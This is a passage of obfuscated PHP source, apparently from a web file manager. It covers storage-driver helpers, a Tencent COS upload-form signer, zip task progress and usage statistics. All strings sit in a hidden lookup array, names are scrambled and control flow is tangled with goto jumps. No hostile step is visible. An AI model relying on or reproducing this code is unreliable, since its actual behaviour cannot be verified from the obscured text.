self::make(Model($FÉÆóôÓ≤⁄[790])->mkdir($D¥£≥üÿ±‰, $b¶úè´ÜÚ‚)); } Model($FÉÆóôÓ≤⁄[730])->set($E∞Óƒ™∫±Ü, $Cü„ïØÉ¥Ò); goto CÁ¡¡ùÖ£‡; CÁ¡¡ùÖ£‡: return $Cü„ïØÉ¥Ò; goto bΩ≠†£ã«ﬂ; AæÎöéÖ Ö: $FÉÆóôÓ≤⁄ =& $_SERVER[ú∫]; $E∞Óƒ™∫±Ü = $FÉÆóôÓ≤⁄[1178] . ucfirst($b¶úè´ÜÚ‚); $Cü„ïØÉ¥Ò = Model($FÉÆóôÓ≤⁄[730])->get($E∞Óƒ™∫±Ü); goto CÁÊÊÙ„å¢; bΩ≠†£ã«ﬂ: } public static function systemFolder($D’à‡Ëñ”€) { $F•ñË„Öê = IO_PATH_SYSTEM_SOURCE . $D’à‡Ëñ”€; $AÏ¶óû†ãŸ = Cache::get($F•ñË„Öê); if (!$AÏ¶óû†ãŸ) { $fË·Í†Ñ≥ê = IO::infoFull($F•ñË„Öê); if (!$fË·Í†Ñ≥ê) { $AÏ¶óû†ãŸ = IO::mkdir($F•ñË„Öê, REPEAT_SKIP); } else { $AÏ¶óû†ãŸ = $fË·Í†Ñ≥ê[$_SERVER[ú∫][76]]; } Cache::set($F•ñË„Öê, $AÏ¶óû†ãŸ, 3600 * 10); } return $AÏ¶óû†ãŸ; } public static function defaultDriver() { return Model($_SERVER[ú∫][727])->defaultDriver(); } public static function defaultIO() { $aëßÏçœ¬Ö =& $_SERVER[ú∫]; $a§Ç÷ûÖ‰¶ = self::defaultDriver(); return $aëßÏçœ¬Ö[1179] . $a§Ç÷ûÖ‰¶[$aëßÏçœ¬Ö[393]] . $aëßÏçœ¬Ö[1168]; } public static function defaultDriverInit() { static $e◊ﬂ†ÁÑﬂÆ = false; if ($e◊ﬂ†ÁÑﬂÆ) { return $e◊ﬂ†ÁÑﬂÆ; } $e◊ﬂ†ÁÑﬂÆ = IO::init(self::defaultIO()); return $e◊ﬂ†ÁÑﬂÆ; } public static function fileTypeList() { $Fπ«¶¶Ã√ë =& $_SERVER[ú∫]; $Aî∫‚©ªπÜ = $GLOBALS[$Fπ«¶¶Ã√ë[6]][$Fπ«¶¶Ã√ë[1180]]; foreach ($Aî∫‚©ªπÜ as $dâ†„ä”©Ò => $F…ûâõë‘≤) { $B±ÉÕù”· = $Fπ«¶¶Ã√ë[1181] . $dâ†„ä”©Ò; $a¯Ÿ©Úó⁄ø = LNG($B±ÉÕù”·); if ($B±ÉÕù”· != $a¯Ÿ©Úó⁄ø) { $Aî∫‚©ªπÜ[$dâ†„ä”©Ò][$Fπ«¶¶Ã√ë[28]] = $a¯Ÿ©Úó⁄ø; } } return $Aî∫‚©ªπÜ; } public static function transferType($Eí ÉÙñ¬§, $EÖÛ—Ø©Æâ) { goto dÜâ¨≤ü≈ã; eïª•ïëµÛ: if ($c ¢ê˘†Ï›[$eæ÷Îí›é[29]] == $c–µÜ∫·¶»[$eæ÷Îí›é[29]] && $c ¢ê˘†Ï›[$eæ÷Îí›é[1182]] == $c–µÜ∫·¶»[$eæ÷Îí›é[1182]]) { return $eæ÷Îí›é[1183]; } if ($c ¢ê˘†Ï›[$eæ÷Îí›é[29]] == $eæ÷Îí›é[830] && $c–µÜ∫·¶»[$eæ÷Îí›é[29]] == $eæ÷Îí›é[106]) { return $eæ÷Îí›é[1094]; } if ($c ¢ê˘†Ï›[$eæ÷Îí›é[29]] == $eæ÷Îí›é[106] && $c–µÜ∫·¶»[$eæ÷Îí›é[29]] == $eæ÷Îí›é[830]) { return $eæ÷Îí›é[107]; } goto Fâì„¡í√‚; dÜâ¨≤ü≈ã: $eæ÷Îí›é =& $_SERVER[ú∫]; $c ¢ê˘†Ï› = self::driverType($Eí ÉÙñ¬§); $c–µÜ∫·¶» = self::driverType($EÖÛ—Ø©Æâ); goto eïª•ïëµÛ; Fâì„¡í√‚: return $eæ÷Îí›é[1184]; goto BÿΩ√´Œ›≥; BÿΩ√´Œ›≥: } public static function driverType($B’‹°◊öı·) { goto Cµ«õüÂ≠≥; Cµ«õüÂ≠≥: $Cç¶—è«ƒ∫ =& $_SERVER[ú∫]; $A†‰ñ”è€ë = $B’‹°◊öı·->path; $fè¥Ü¶Ñ‘é = str_replace($Cç¶—è«ƒ∫[1185], $Cç¶—è«ƒ∫[33], strtolower($B’‹°◊öı·->getType())); goto CéÂÈÆµàÙ; CéÂÈÆµàÙ: if ($fè¥Ü¶Ñ‘é == $Cç¶—è«ƒ∫[718] || $fè¥Ü¶Ñ‘é == $Cç¶—è«ƒ∫[1186] || $fè¥Ü¶Ñ‘é == $Cç¶—è«ƒ∫[1187]) { $B’‹°◊öı· = self::defaultDriverInit(); } else { if ($fè¥Ü¶Ñ‘é == $Cç¶—è«ƒ∫[1101] || $fè¥Ü¶Ñ‘é == $Cç¶—è«ƒ∫[1188]) { $B’‹°◊öı· = IO::init($B’‹°◊öı·->pathParse[$Cç¶—è«ƒ∫[1048]]); } } $fè¥Ü¶Ñ‘é = str_replace($Cç¶—è«ƒ∫[1185], $Cç¶—è«ƒ∫[33], strtolower($B’‹°◊öı·->getType())); if ($fè¥Ü¶Ñ‘é == $Cç¶—è«ƒ∫[106]) { return array($Cç¶—è«ƒ∫[29] => $Cç¶—è«ƒ∫[106], $Cç¶—è«ƒ∫[1182] => $Cç¶—è«ƒ∫[33], $Cç¶—è«ƒ∫[76] => $A†‰ñ”è€ë); } goto DÑö¡ßËºØ; DÑö¡ßËºØ: return array($Cç¶—è«ƒ∫[29] => $Cç¶—è«ƒ∫[830], $Cç¶—è«ƒ∫[1182] => $B’‹°◊öı·->pathDriver, $Cç¶—è«ƒ∫[76] => $A†‰ñ”è€ë); goto CƒÃ†Ò∑ÏØ; CƒÃ†Ò∑ÏØ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($DéŒ∫∞“¶Ã) { parent::__construct($DéŒ∫∞“¶Ã); $this->signatureVersion($_SERVER[ú∫][212]); } public function uploadFormData($eï¬ä¥∑∆ª, $Fú™˘·î£¡ = 3600) { goto dÒßˆﬂﬂüÁ; fÈ™ﬂíÛ‚: return $cÖ ¶£¡øπ; goto búÀœ”°Â≠; dÒßˆﬂﬂüÁ: $BÒµã— ‚¢ =& $_SERVER[ú∫]; $b¥±Üøù–„ = $BÒµã— ‚¢[192]; $fùåáπüôå = $BÒµã— ‚¢[230]; goto CÒ‰†óºÓã; B∏ÉÛ∫üâ©: $fﬂ©Ï…ƒ¡„ = sha1($D®ãàäç™£); $e∑Îë∑Áàç = hash_hmac($BÒµã— ‚¢[230], $fﬂ©Ï…ƒ¡„, $D„¥∫ïÚùπ); $cÖ ¶£¡øπ = array($BÒµã— ‚¢[1193] => $b¥±Üøù–„, $BÒµã— ‚¢[1197] => $a™äµ°§®⁄, $BÒµã— ‚¢[1201] => base64_encode($D®ãàäç™£), $BÒµã— ‚¢[1198] => $fùåáπüôå, $BÒµã— ‚¢[1199] => $this->accessKey, $BÒµã— ‚¢[1202] => $FóÕﬂåÊÎÀ, $BÒµã— ‚¢[1203] => $e∑Îë∑Áàç, $BÒµã— ‚¢[175] => $this->getHost()); goto fÈ™ﬂíÛ‚; CÒ‰†óºÓã: $a™äµ°§®⁄ = $BÒµã— ‚¢[1189]; $e∞ê‘û∆Ôê = gmdate($BÒµã— ‚¢[1190], time() + $Fú™˘·î£¡); $FóÕﬂåÊÎÀ = (string) time() . $BÒµã— ‚¢[68] . (string) (time() + $Fú™˘·î£¡); goto DÖ¢Öá¢ÊÑ; DÖ¢Öá¢ÊÑ: $D®ãàäç™£ = array($BÒµã— ‚¢[1191] => $e∞ê‘û∆Ôê, $BÒµã— ‚¢[1192] => array(array($BÒµã— ‚¢[1193] => $b¥±Üøù–„), array($BÒµã— ‚¢[1194] => $this->bucket), array($BÒµã— ‚¢[1195], $BÒµã— ‚¢[1196], $BÒµã— ‚¢[33]), array($BÒµã— ‚¢[1197] => $a™äµ°§®⁄), array($BÒµã— ‚¢[1198] => $fùåáπüôå), array($BÒµã— ‚¢[1199] => $this->accessKey), array($BÒµã— ‚¢[1200] => $FóÕﬂåÊÎÀ))); $D®ãàäç™£ = json_encode($D®ãàäç™£); $D„¥∫ïÚùπ = hash_hmac($BÒµã— ‚¢[230], $FóÕﬂåÊÎÀ, $this->secret); goto B∏ÉÛ∫üâ©; búÀœ”°Â≠: } public function fileOutLink($fﬁõÎÈ≠ËÙ) { $cÑ¡–≈îÜ =& $_SERVER[ú∫]; if (substr($fﬁõÎÈ≠ËÙ, 0, 7) == $cÑ¡–≈îÜ[1204]) { $fﬁõÎÈ≠ËÙ = $cÑ¡–≈îÜ[1205] . substr($fﬁõÎÈ≠ËÙ, 7); } header($cÑ¡–≈îÜ[159] . $fﬁõÎÈ≠ËÙ); die; } } goto AãüÚ’∂É◊; C”ë±·µ˜à: class TaskZip extends TaskFileTransfer { protected function startAfter() { $Aë°Ú◊–§§ =& $_SERVER[ú∫]; parent::startAfter(); Hook::bind($Aë°Ú◊–§§[1616], array($this, $Aë°Ú◊–§§[1611])); $fÑÜáµ‡‡ã =& $this->task; $fÑÜáµ‡‡ã[$Aë°Ú◊–§§[1613]] = $Aë°Ú◊–§§[1094]; if (!$fÑÜáµ‡‡ã[$Aë°Ú◊–§§[1432]]) { $fÑÜáµ‡‡ã[$Aë°Ú◊–§§[1432]] = LNG($Aë°Ú◊–§§[1617]); } } protected function endAfter() { $c‹¥Êæ¥€≥ =& $_SERVER[ú∫]; parent::endAfter(); Hook::unbind($c‹¥Êæ¥€≥[1616], array($this, $c‹¥Êæ¥€≥[1611])); } public function updateAfter() { $BÒäÖñçéè =& $_SERVER[ú∫]; $f√ﬁò©Ó“€ =& $this->task; if (!$f√ﬁò©Ó“€[$BÒäÖñçéè[1021]] || !$f√ﬁò©Ó“€[$BÒäÖñçéè[723]]) { return; } if ($f√ﬁò©Ó“€[$BÒäÖñçéè[1613]] == $BÒäÖñçéè[1094]) { $Cëâ¬ˆ„⁄ã = $f√ﬁò©Ó“€[$BÒäÖñçéè[1573]]; if ($f√ﬁò©Ó“€[$BÒäÖñçéè[1574]] != $BÒäÖñçéè[1094]) { $Cëâ¬ˆ„⁄ã = 0; } $aô≈Ù∏¯≈ù = ($f√ﬁò©Ó“€[$BÒäÖñçéè[1577]] + $Cëâ¬ˆ„⁄ã) / $f√ﬁò©Ó“€[$BÒäÖñçéè[723]]; $f√ﬁò©Ó“€[$BÒäÖñçéè[1529]] = $aô≈Ù∏¯≈ù * 0.3; } else { if ($f√ﬁò©Ó“€[$BÒäÖñçéè[1613]] == $BÒäÖñçéè[311]) { $aô≈Ù∏¯≈ù = $f√ﬁò©Ó“€[$BÒäÖñçéè[1036]] / $f√ﬁò©Ó“€[$BÒäÖñçéè[1021]]; $f√ﬁò©Ó“€[$BÒäÖñçéè[1529]] = 0.3 + $aô≈Ù∏¯≈ù * 0.5; } else { if ($f√ﬁò©Ó“€[$BÒäÖñçéè[1613]] == $BÒäÖñçéè[107]) { $aô≈Ù∏¯≈ù = 0; if ($f√ﬁò©Ó“€[$BÒäÖñçéè[1572]]) { $aô≈Ù∏¯≈ù = $f√ﬁò©Ó“€[$BÒäÖñçéè[1573]] / $f√ﬁò©Ó“€[$BÒäÖñçéè[1572]]; } $f√ﬁò©Ó“€[$BÒäÖñçéè[1529]] = 0.3 + 0.5 + $aô≈Ù∏¯≈ù * 0.2; } } } if ($f√ﬁò©Ó“€[$BÒäÖñçéè[1529]] > 0) { $eã…Œ®…Û† = timeFloat() - $f√ﬁò©Ó“€[$BÒäÖñçéè[749]] - $f√ﬁò©Ó“€[$BÒäÖñçéè[1532]]; $f√ﬁò©Ó“€[$BÒäÖñçéè[1533]] = $eã…Œ®…Û† * (1 - $f√ﬁò©Ó“€[$BÒäÖñçéè[1529]]) / $f√ﬁò©Ó“€[$BÒäÖñçéè[1529]]; } } public function copyFileStart($C⁄Ö»÷¶◊•, $Dº≤ç¡âÖ◊, $eöﬂ˘±õÉø, $d∆◊ÜÕÓﬂ‚, $E›¯ﬁãøÍ∏, $D´≠Úøæ„Ñ) { $A∆¯„áí›‹ =& $_SERVER[ú∫]; parent::copyFileStart($C⁄Ö»÷¶◊•, $Dº≤ç¡âÖ◊, $eöﬂ˘±õÉø, $d∆◊ÜÕÓﬂ‚, $E›¯ﬁãøÍ∏, $D´≠Úøæ„Ñ); $B¬≤Ñ¶·âÉ =& $this->task; if ($B¬≤Ñ¶·âÉ[$A∆¯„áí›‹[1613]] == $A∆¯„áí›‹[311]) { $B¬≤Ñ¶·âÉ[$A∆¯„áí›‹[1613]] = $A∆¯„áí›‹[107]; } $this->update(); } public function copyFileEnd($Eö’äå∫ı∂, $cﬂøÙ—Î†¨, $BÍàËâ∏ïÙ, $B¬ÌòÑñÃé, $F©ËÆîçöË, $b¿éãÂç¿ü) { $F€πàÍ∑‡ﬁ =& $_SERVER[ú∫]; $Eøâ‚•Ó£≠ =& $this->task; $Eøâ‚•Ó£≠[$F€πàÍ∑‡ﬁ[1573]] = $Eøâ‚•Ó£≠[$F€πàÍ∑‡ﬁ[1572]]; $Eøâ‚•Ó£≠[$F€πàÍ∑‡ﬁ[1577]] += $Eøâ‚•Ó£≠[$F€πàÍ∑‡ﬁ[1572]]; $Eøâ‚•Ó£≠[$F€πàÍ∑‡ﬁ[1574]] = $F€πàÍ∑‡ﬁ[33]; $this->update(); } public function nameParse($aòì§π·≠Ÿ) { $C“’ôÜçÊı =& $_SERVER[ú∫]; $aı≠‘ªπ…Í =& $this->task; if ($aı≠‘ªπ…Í[$C“’ôÜçÊı[1036]] < $aı≠‘ªπ…Í[$C“’ôÜçÊı[1021]]) { $cÔåÛòÁ„î = get_path_this($aòì§π·≠Ÿ); if (strstr($cÔåÛòÁ„î, $C“’ôÜçÊı[95])) { $aı≠‘ªπ…Í[$C“’ôÜçÊı[1036]] += 1; } } if ($aı≠‘ªπ…Í[$C“’ôÜçÊı[1613]] == $C“’ôÜçÊı[1094]) { $aı≠‘ªπ…Í[$C“’ôÜçÊı[1613]] = $C“’ôÜçÊı[311]; } $aı≠‘ªπ…Í[$C“’ôÜçÊı[1570]] = $aòì§π·≠Ÿ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($D¥èıƒíŒ†) { $B¬Ê¥ïóäé =& $_SERVER[ú∫]; $eõÂﬂ’·±Ó = array($B¬Ê¥ïóäé[562] => array($B¬Ê¥ïóäé[29] => $B¬Ê¥ïóäé[1618], $B¬Ê¥ïóäé[271] => array($B¬Ê¥ïóäé[222], $B¬Ê¥ïóäé[725], $B¬Ê¥ïóäé[1619], $B¬Ê¥ïóäé[1620])), $B¬Ê¥ïóäé[1621] => array($B¬Ê¥ïóäé[29] => $B¬Ê¥ïóäé[1622], $B¬Ê¥ïóäé[271] => array($B¬Ê¥ïóäé[222], $B¬Ê¥ïóäé[723], $B¬Ê¥ïóäé[1623], $B¬Ê¥ïóäé[1624], $B¬Ê¥ïóäé[1625]))); if (!isset($eõÂﬂ’·±Ó[$D¥èıƒíŒ†])) { return !1; } $this->optionType = $eõÂﬂ’·±Ó[$D¥èıƒíŒ†][$B¬Ê¥ïóäé[29]]; $this->field = $eõÂﬂ’·±Ó[$D¥èıƒíŒ†][$B¬Ê¥ïóäé[271]]; return !0; } public function listData($F·ä‹ü◊Òü = false, $D °’çÀæè = "\x6d\x6f\x64\151\146\171\124\151\x6d\x65", $EÇä∑‘Õ¥˘ = false) { return parent::listData($F·ä‹ü◊Òü, $D °’çÀæè, $EÇä∑‘Õ¥˘); } public function trendList($dãÓ†ë◊°ª) { goto eä¯¶ÀÉÚ≥; eä¯¶ÀÉÚ≥: $DÖè·∞¨Ã∑ =& $_SERVER[ú∫]; $bãê⁄ì§Úó = $this->listData(); if ($bãê⁄ì§Úó) { $a¡ö†éô∏⁄ = end($bãê⁄ì§Úó); $B±èéâÛ© = date($DÖè·∞¨Ã∑[1626], strtotime($DÖè·∞¨Ã∑[1627])); if ($a¡ö†éô∏⁄[$DÖè·∞¨Ã∑[222]] == $B±èéâÛ©) { return $bãê⁄ì§Úó; } $f˜—ï·≤›æ = strtotime($a¡ö†éô∏⁄[$DÖè·∞¨Ã∑[222]]); } goto f÷Ç≤›‰ëÏ; f÷Ç≤›‰ëÏ: if (!isset($f˜—ï·≤›æ)) { $E˘å»÷îäÏ = $dãÓ†ë◊°ª == $DÖè·∞¨Ã∑[562] ? $DÖè·∞¨Ã∑[506] : $DÖè·∞¨Ã∑[790]; $f˜—ï·≤›æ = Model($E˘å»÷îäÏ)->min($DÖè·∞¨Ã∑[194]); } $FÙ∞’ıò•◊ = $DÖè·∞¨Ã∑[1628] . ucfirst($dãÓ†ë◊°ª); $e∆Ú‡¢û¯ñ = $this->dateList($f˜—ï·≤›æ); goto f˜©Ö ¬åˆ; f˜©Ö ¬åˆ: foreach ($e∆Ú‡¢û¯ñ as $B±èéâÛ©) { $this->{$FÙ∞’ıò•◊}($B±èéâÛ©); } return $this->listData(); goto dπ…áùí⁄∑; dπ…áùí⁄∑: } private function dateList($eÛ®≥Ω“Áî) { $e∆Ñô˜Õ·ê =& $_SERVER[ú∫]; $bó¢‚ÀöÕÓ = $eÛ®≥Ω“Áî; $A«£éöêÈ¶ = strtotime($e∆Ñô˜Õ·ê[1627]); $aÜ„–ïÊÚÑ = array(); while ($bó¢‚ÀöÕÓ <= $A«£éöêÈ¶) { $aÜ„–ïÊÚÑ[] = date($e∆Ñô˜Õ·ê[1626], $bó¢‚ÀöÕÓ); $bó¢‚ÀöÕÓ = strtotime($e∆Ñô˜Õ·ê[1629], $bó¢‚ÀöÕÓ); } return $aÜ„–ïÊÚÑ; } public function _recordUser($D©‡Ãø∏ã¢ = '') { goto DƒÛëπÕº¯; b∆¬ì¿—œ≤: $d∂√œ´î§ù = array($a•ÈìòµõÈ[222] => $D©‡Ãø∏ã¢, $a•ÈìòµõÈ[725] => (int) $Fê∑õ¢æ®›, $a•ÈìòµõÈ[1619] => (int) $dÛÈÚáÿä∞, $a•ÈìòµõÈ[1620] => (int) $DÜ®‘Ëäª«); return $this->insert($d∂√œ´î§ù); goto A®Ø¯ƒÁ«Ø; fÙ÷à◊∂Úâ: $dÛÈÚáÿä∞ = Model($a•ÈìòµõÈ[506])->where($bﬂ¨©ı–∞ò)->count($a•ÈìòµõÈ[1528]); $bﬂ¨©ı–∞ò[$a•ÈìòµõÈ[29]] = $a•ÈìòµõÈ[1632]; $DÜ®‘Ëäª« = Model($a•ÈìòµõÈ[1633])->where($bﬂ¨©ı–∞ò)->count($a•ÈìòµõÈ[1634]); goto b∆¬ì¿—œ≤; e—¥ò÷∏‰ù: $bﬂ¨©ı–∞ò = array($a•ÈìòµõÈ[194] => array($a•ÈìòµõÈ[970], $aé⁄ÖäâØè)); $Fê∑õ¢æ®› = Model($a•ÈìòµõÈ[506])->where($bﬂ¨©ı–∞ò)->count($a•ÈìòµõÈ[1528]); $bﬂ¨©ı–∞ò[$a•ÈìòµõÈ[194]] = array($a•ÈìòµõÈ[331], array($AúèÒ∞óôØ, $aé⁄ÖäâØè)); goto fÙ÷à◊∂Úâ; DƒÛëπÕº¯: $a•ÈìòµõÈ =& $_SERVER[ú∫]; $AúèÒ∞óôØ = strtotime(date($a•ÈìòµõÈ[1630], strtotime($D©‡Ãø∏ã¢))); $aé⁄ÖäâØè = strtotime(date($a•ÈìòµõÈ[1631], strtotime($D©‡Ãø∏ã¢))); goto e—¥ò÷∏‰ù; A®Ø¯ƒÁ«Ø: } public function _recordStore($e‰ùâ◊ûÊê = '') { goto A–Èﬁ€Æﬂ¢; A–Èﬁ€Æﬂ¢: $cã»ŒßªºÜ =& $_SERVER[ú∫]; $e¢óÕÆÍÍ‡ = strtotime(date($cã»ŒßªºÜ[1631], strtotime($e‰ùâ◊ûÊê))); $b¢Ë≤ÕÕß˜ = array($cã»ŒßªºÜ[194] => array($cã»ŒßªºÜ[970], $e¢óÕÆÍÍ‡)); goto Dê«Üî∫˜Ö; FÚÇÑçò·: $FØñäéÌ±ö = Model($cã»ŒßªºÜ[790])->where($b¢Ë≤ÕÕß˜)->sum($cã»ŒßªºÜ[78]); $a◊·èµ Ãâ = array($cã»ŒßªºÜ[222] => $e‰ùâ◊ûÊê, $cã»ŒßªºÜ[723] => (int) $bÙ≠£áÏâœ, $cã»ŒßªºÜ[1623] => (int) $c∫ÿÏÇ˜Ò , $cã»ŒßªºÜ[1624] => (int) $Füß‰ó∂Ù¡, $cã»ŒßªºÜ[1625] => (int) $FØñäéÌ±ö); return $this->insert($a◊·èµ Ãâ); goto cç‰•°“ëî; Dê«Üî∫˜Ö: $c∫ÿÏÇ˜Ò  = Model($cã»ŒßªºÜ[450])->where($b¢Ë≤ÕÕß˜)->sum($cã»ŒßªºÜ[78]); $b¢Ë≤ÕÕß˜[$cã»ŒßªºÜ[403]] = 0; $bÙ≠£áÏâœ = Model($cã»ŒßªºÜ[790])->where($b¢Ë≤ÕÕß˜)->sum($cã»ŒßªºÜ[78]); goto Eµ‘Ö¯Ò€Ò; Eµ‘Ö¯Ò€Ò: $b¢Ë≤ÕÕß˜[$cã»ŒßªºÜ[404]] = 1; $Füß‰ó∂Ù¡ = Model($cã»ŒßªºÜ[790])->where($b¢Ë≤ÕÕß˜)->sum($cã»ŒßªºÜ[78]); $b¢Ë≤ÕÕß˜[$cã»ŒßªºÜ[404]] = 2; goto FÚÇÑçò·; cç‰•°“ëî: } public function trend($f„ì™‡ù£å, $Cõ£Ëö¨ÖÊ) { goto fœÖÓéàÃò; fœÖÓéàÃò: $EÈﬁâ›£ëõ =& $_SERVER[ú∫]; if (!$this->init($f„ì™‡ù£å)) { return !1; } $føÖ…Îî“ó = $this->trendList($f„ì™‡ù£å); goto DÇùπ∑≠Ë¡; DÇùπ∑≠Ë¡: if ($føÖ…Îî“ó && $Cõ£Ëö¨ÖÊ != $EÈﬁâ›£ëõ[1502]) { $fÊ∑É‡‚≥â = $føÖ…Îî“ó[0][$EÈﬁâ›£ëõ[222]]; $cﬂé˜Ú–Ç = $this->validDate($Cõ£Ëö¨ÖÊ, $fÊ∑É‡‚≥â); $c‰’ïßÜ°é = array(); $aÑ√ù€é¬Ñ = array_to_keyvalue($føÖ…Îî“ó, $EÈﬁâ›£ëõ[222]); foreach ($cﬂé˜Ú–Ç as $DÕ„ªø⁄Í£) { if (isset($aÑ√ù€é¬Ñ[$DÕ„ªø⁄Í£])) { $Aˆ®¢ƒ¬°Ã = $aÑ√ù€é¬Ñ[$DÕ„ªø⁄Í£]; } else { $Aˆ®¢ƒ¬°Ã = end($føÖ…Îî“ó); $Aˆ®¢ƒ¬°Ã[$EÈﬁâ›£ëõ[222]] = $DÕ„ªø⁄Í£; if ($f„ì™‡ù£å == $EÈﬁâ›£ëõ[562]) { $Aˆ®¢ƒ¬°Ã[$EÈﬁâ›£ëõ[1619]] = $Aˆ®¢ƒ¬°Ã[$EÈﬁâ›£ëõ[1620]] = 0; } } $c‰’ïßÜ°é[] = $Aˆ®¢ƒ¬°Ã; } $føÖ…Îî“ó = $c‰’ïßÜ°é; } $C≈ùÉ≈‰‰è = array($EÈﬁâ›£ëõ[562] => array($EÈﬁâ›£ëõ[725] => LNG($EÈﬁâ›£ëõ[1635]), $EÈﬁâ›£ëõ[1619] => LNG($EÈﬁâ›£ëõ[1636]), $EÈﬁâ›£ëõ[1620] => LNG($EÈﬁâ›£ëõ[1637])), $EÈﬁâ›£ëõ[1621] => array($EÈﬁâ›£ëõ[723] => LNG($EÈﬁâ›£ëõ[1638]), $EÈﬁâ›£ëõ[1623] => LNG($EÈﬁâ›£ëõ[1639]), $EÈﬁâ›£ëõ[1624] => LNG($EÈﬁâ›£ëõ[1640]), $EÈﬁâ›£ëõ[1625] => LNG($EÈﬁâ›£ëõ[1641]))); $aëı∆åƒÌ≠ = array($EÈﬁâ›£ëõ[562] => $EÈﬁâ›£ëõ[1642], $EÈﬁâ›£ëõ[1621] => $EÈﬁâ›£ëõ[78]); goto A¯›·Ûè∞Ñ; A¯›·Ûè∞Ñ: if (empty($føÖ…Îî“ó)) { $DÕ„ªø⁄Í£ = date($EÈﬁâ›£ëõ[1626], strtotime($EÈﬁâ›£ëõ[1627])); $bô∑∑¯ÓìÈ = array($EÈﬁâ›£ëõ[222] => $DÕ„ªø⁄Í£); foreach ($C≈ùÉ≈‰‰è[$f„ì™‡ù£å] as $A–Ω⁄àªïﬂ => $Cä¥ËÏ¡Ÿß) { $bô∑∑¯ÓìÈ[$A–Ω⁄àªïﬂ] = 0; } $føÖ…Îî“ó[] = $bô∑∑¯ÓìÈ; } $Aà¿ΩÉﬂÑ– = array(); foreach ($føÖ…Îî“ó as $Cä¥ËÏ¡Ÿß) { if ($f„ì™‡ù£å == $EÈﬁâ›£ëõ[1621] && $Cä¥ËÏ¡Ÿß[$EÈﬁâ›£ëõ[1623]] > $Cä¥ËÏ¡Ÿß[$EÈﬁâ›£ëõ[723]]) { $Cä¥ËÏ¡Ÿß[$EÈﬁâ›£ëõ[1623]] = $Cä¥ËÏ¡Ÿß[$EÈﬁâ›£ëõ[723]]; } foreach ($C≈ùÉ≈‰‰è[$f„ì™‡ù£å] as $A–Ω⁄àªïﬂ => $fºŒ÷œ°≈ı) { $Aˆ®¢ƒ¬°Ã = array($EÈﬁâ›£ëõ[222] => $Cä¥ËÏ¡Ÿß[$EÈﬁâ›£ëõ[222]], $EÈﬁâ›£ëõ[1432] => $fºŒ÷œ°≈ı); $Aˆ®¢ƒ¬°Ã[$aëı∆åƒÌ≠[$f„ì™‡ù£å]] = isset($Cä¥ËÏ¡Ÿß[$A–Ω⁄àªïﬂ]) ? $Cä¥ËÏ¡Ÿß[$A–Ω⁄àªïﬂ] : 0; $Aà¿ΩÉﬂÑ–[] = $Aˆ®¢ƒ¬°Ã; } } goto a—Éê∂íæ€; a—Éê∂íæ€: return $Aà¿ΩÉﬂÑ–; goto Eœœ•·¿ÔÇ; Eœœ•·¿ÔÇ: } public function validDate($FÇ–ºéôª√, $d©õ‡õÊ«∑) { goto aœ÷√ÊáŸ…; aœ÷√ÊáŸ…: $eÃ§é∑â—ä =& $_SERVER[ú∫]; $Aˆ®•÷›ˆå = date($eÃ§é∑â—ä[1626], strtotime($eÃ§é∑â—ä[1627])); $Bê—¶ÑÈëä = array($Aˆ®•÷›ˆå); goto eàÌ¶áó‘Î; eàÌ¶áó‘Î: switch ($FÇ–ºéôª√) { case $eÃ§é∑â—ä[1509]: $Bƒ◊⁄∫ÇÏ´ = mktime(0, 0, 0, date($eÃ§é∑â—ä[1643]), date($eÃ§é∑â—ä[1253]) - date($eÃ§é∑â—ä[1315]) + 7 - 7, date($eÃ§é∑â—ä[1644])); $DÎ™ûπê¯Ÿ = 0; do { $f‚‡ÒÉ—≈≤ = date($eÃ§é∑â—ä[1626], $Bƒ◊⁄∫ÇÏ´ - 3600 * 24 * 7 * $DÎ™ûπê¯Ÿ); $Bê—¶ÑÈëä[] = $f‚‡ÒÉ—≈≤; $DÎ™ûπê¯Ÿ++; } while ($d©õ‡õÊ«∑ < $f‚‡ÒÉ—≈≤); break; case $eÃ§é∑â—ä[1507]: $DÎ™ûπê¯Ÿ = 1; do { $DÈµœ¬ü‡â = date($eÃ§é∑â—ä[1645], strtotime("\55\x20{$DÎ™ûπê¯Ÿ}\40\155\x6f\156\164\x68\x73")); $Bê—¶ÑÈëä[] = $DÈµœ¬ü‡â; $DÎ™ûπê¯Ÿ++; } while ($d©õ‡õÊ«∑ < $DÈµœ¬ü‡â); break; case $eÃ§é∑â—ä[1646]: $EÇ¨∫∏†ÿâ = (int) date($eÃ§é∑â—ä[1644], strtotime($d©õ‡õÊ«∑)); $fÿ©ﬁ¿≈Û‹ = (int) date($eÃ§é∑â—ä[1644]); if ($EÇ¨∫∏†ÿâ >= $fÿ©ﬁ¿≈Û‹) { break; } for ($EÇ¨∫∏†ÿâ; $EÇ¨∫∏†ÿâ < $fÿ©ﬁ¿≈Û‹; $EÇ¨∫∏†ÿâ++) { $Bê—¶ÑÈëä[] = $EÇ¨∫∏†ÿâ . $eÃ§é∑â—ä[1647]; } break; default: break; } if ($d©õ‡õÊ«∑ > end($Bê—¶ÑÈëä)) { array_pop($Bê—¶ÑÈëä); } sort($Bê—¶ÑÈëä); goto fùæ∑é“ºë; fùæ∑é“ºë: return $Bê—¶ÑÈëä; goto aÜ·Ω∫£„≥; aÜ·Ω∫£„≥: } public function listTable($Fí¢çä—å⁄) { $eﬂÙ’àøô• = ucfirst($Fí¢çä—å⁄); return Model($eﬂÙ’àøô•)->listData(); } public function option($Bäﬁ≥£¿àã) { $FãπˆäóÑÆ = $_SERVER[ú∫][1648] . ucfirst($Bäﬁ≥£¿àã); return $this->{$FãπˆäóÑÆ}(); } private function optionUser() { goto c≠ñŸ“ï»”; c≠ñŸ“ï»”: $eœ›÷¥¡´° =& $_SERVER[ú∫]; $cÈáØª»Œ∂ = Model($eœ›÷¥¡´°[506])->count($eœ›÷¥¡´°[1528]); $aƒÕã™úã∂ = Model($eœ›÷¥¡´°[506])->where($eœ›÷¥¡´°[1649])->count($eœ›÷¥¡´°[1528]); goto d¶îôÿÓ–√; aúúÉïÜ á: if ($d¿®óùØœ < $FáÿÁˆçﬂº) { $d¿®óùØœ = $FáÿÁˆçﬂº; } $D÷Ø—ΩÒ∏• = array($eœ›÷¥¡´°[1650] => array($eœ›÷¥¡´°[971], $d¿®óùØœ)); $CÕ¨§‡Á¶Ù = (int) Model($eœ›÷¥¡´°[506])->where($D÷Ø—ΩÒ∏•)->count($eœ›÷¥¡´°[1528]); goto bó£±Éïﬁ°; d¶îôÿÓ–√: 